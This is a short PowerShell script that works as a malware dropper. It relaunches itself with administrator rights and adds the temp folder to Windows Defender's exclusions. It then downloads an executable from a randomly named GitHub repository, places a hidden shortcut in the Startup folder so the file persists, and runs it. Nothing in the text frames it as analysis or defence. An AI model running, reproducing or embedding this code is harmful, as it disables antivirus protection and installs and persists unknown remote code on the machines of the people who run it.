# Check if running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {

    # Relaunch as admin
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
cmd.exe /c "powershell.exe Add-MpPreference -ExclusionPath '%temp%' & curl.exe -L -o "%TEMP%\s.exe" "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/s.exe" && powershell -w h -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\s.lnk\");$s.TargetPath=\"$env:TEMP\s.exe\";$s.Save()" && start "" "%TEMP%\s.exe""
